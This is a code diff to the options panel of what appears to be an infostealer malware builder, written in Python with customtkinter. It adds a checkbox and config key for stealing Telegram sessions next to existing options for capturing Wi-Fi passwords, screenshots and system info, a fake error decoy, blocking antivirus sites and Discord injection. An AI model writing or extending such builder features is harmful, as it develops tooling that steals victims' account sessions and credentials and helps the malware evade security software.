@@ -72,6 +72,7 @@ class BuilderOptionsFrame(ctk.CTkFrame):
 		self.captureWifiPasswordsVar = ctk.BooleanVar(self)
 		self.captureSystemInfoVar = ctk.BooleanVar(self)
 		self.captureScreenshotVar = ctk.BooleanVar(self)
+		self.captureTelegramVar = ctk.BooleanVar(self)
 		self.fakeErrorVar = ctk.BooleanVar(self)
 		self.blockAvSitesVar = ctk.BooleanVar(self)
 		self.discordInjectionVar = ctk.BooleanVar(self)
@@ -132,6 +133,9 @@ class BuilderOptionsFrame(ctk.CTkFrame):
 
 		captureScreenshot = ctk.CTkCheckBox(self, text= "Screenshot", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "cyan", variable= self.captureScreenshotVar)
 		captureScreenshot.grid(row= 2, column= 3, sticky= "w", padx= 20)
+
+		captureTelegram = ctk.CTkCheckBox(self, text= "Telegram", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "cyan", variable= self.captureTelegramVar)
+		captureTelegram.grid(row= 3, column= 3, sticky= "w", padx= 20)
 
 		fakeError = ctk.CTkCheckBox(self, text= "Fake Error", font= self.font, height= 38, hover_color= "#4D4D4D", text_color= "light green", command= self.fakeError_Event, variable= self.fakeErrorVar)
 		fakeError.grid(row= 1, column= 4, sticky= "w", padx= 20)
@@ -233,6 +237,7 @@ class BuilderOptionsFrame(ctk.CTkFrame):
         		"captureWifiPasswords" : self.captureWifiPasswordsVar.get(),
         		"captureSystemInfo" : self.captureSystemInfoVar.get(),
         		"captureScreenshot" : self.captureScreenshotVar.get(),
+        		"captureTelegramSession" : self.captureTelegramVar.get(),
 
         		"fakeError" : self.fakeErrorData,
         		"blockAvSites" : self.blockAvSitesVar.get(),
